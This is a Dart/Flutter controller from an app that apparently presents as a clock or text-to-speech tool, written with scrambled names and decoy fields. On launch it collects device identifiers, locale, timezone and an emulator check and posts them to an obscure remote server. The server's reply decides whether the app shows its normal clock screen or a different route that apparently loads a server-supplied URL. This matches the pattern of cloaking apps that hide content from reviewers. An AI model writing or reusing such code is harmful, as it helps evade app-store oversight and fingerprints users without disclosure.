import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void mvklhas() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/notFound");
  }
}

class TtsInitLogic extends GetxController {

  var bxdpyklzv = RxBool(false);
  var iwayesm = RxBool(true);
  var xpjtaqi = RxString("");
  var theodora = RxBool(false);
  var beer = RxBool(true);
  final qilmheao = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    mvklhas();
    nxfcp();
  }


  Future<void> nxfcp() async {

    theodora.value = true;
    beer.value = true;
    iwayesm.value = false;

    qilmheao.post("https://api.decpcos.space/cyaebvukofghzpiqtdsxjm",data: await lgadcnwst()).then((value) {
      var bdkorh = value.data["bdkorh"] as String;
      var vbuq = value.data["vbuq"] as bool;
      if (vbuq) {
        xpjtaqi.value = bdkorh;
        chauncey();
      } else {
        welch();
      }
    }).catchError((e) {
      iwayesm.value = true;
      beer.value = true;
      theodora.value = false;
    });
  }

  Future<Map<String, dynamic>> lgadcnwst() async {
    final DeviceInfoPlugin ajzphkr = DeviceInfoPlugin();
    PackageInfo hakf_ndupfohx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lipf = Platform.localeName;
    var sptuoe_xWsohvp = currentTimeZone;

    var sptuoe_uARYlC = hakf_ndupfohx.packageName;
    var sptuoe_GcaJg = hakf_ndupfohx.version;
    var sptuoe_Zu = hakf_ndupfohx.buildNumber;

    var sptuoe_EaxYid = hakf_ndupfohx.appName;
    var sptuoe_lMSUear = "";
    var sptuoe_ZGfMF  = "";
    var sptuoe_LKvU = "";
    var adelleFisher = "";
    var alfredaShields = "";
    var irwinStrosin = "";
    var elenoraSchaden = "";
    var adolfoBuckridge = "";
    var danaStrosin = "";
    var devinJacobson = "";


    var sptuoe_XeZlFkc = "";
    var sptuoe_iGgE = false;

    if (GetPlatform.isAndroid) {
      sptuoe_XeZlFkc = "android";
      var dvxecq = await ajzphkr.androidInfo;

      sptuoe_LKvU = dvxecq.brand;

      sptuoe_lMSUear  = dvxecq.model;
      sptuoe_ZGfMF = dvxecq.id;

      sptuoe_iGgE = dvxecq.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      sptuoe_XeZlFkc = "ios";
      var unvfmebycz = await ajzphkr.iosInfo;
      sptuoe_LKvU = unvfmebycz.name;
      sptuoe_lMSUear = unvfmebycz.model;

      sptuoe_ZGfMF = unvfmebycz.identifierForVendor ?? "";
      sptuoe_iGgE  = unvfmebycz.isPhysicalDevice;
    }
    var res = {
      "sptuoe_EaxYid": sptuoe_EaxYid,
      "sptuoe_Zu": sptuoe_Zu,
      "sptuoe_GcaJg": sptuoe_GcaJg,
      "sptuoe_lMSUear": sptuoe_lMSUear,
      "lipf": lipf,
      "sptuoe_xWsohvp": sptuoe_xWsohvp,
      "sptuoe_LKvU": sptuoe_LKvU,
      "adolfoBuckridge" : adolfoBuckridge,
      "sptuoe_ZGfMF": sptuoe_ZGfMF,
      "sptuoe_XeZlFkc": sptuoe_XeZlFkc,
      "sptuoe_iGgE": sptuoe_iGgE,
      "sptuoe_uARYlC": sptuoe_uARYlC,
      "adelleFisher" : adelleFisher,
      "alfredaShields" : alfredaShields,
      "irwinStrosin" : irwinStrosin,
      "elenoraSchaden" : elenoraSchaden,
      "danaStrosin" : danaStrosin,
      "devinJacobson" : devinJacobson,

    };
    return res;
  }

  Future<void> welch() async {
    Get.offAllNamed("/clockMain");
  }

  Future<void> chauncey() async {
    Get.offAllNamed("/clockClean");
  }

}
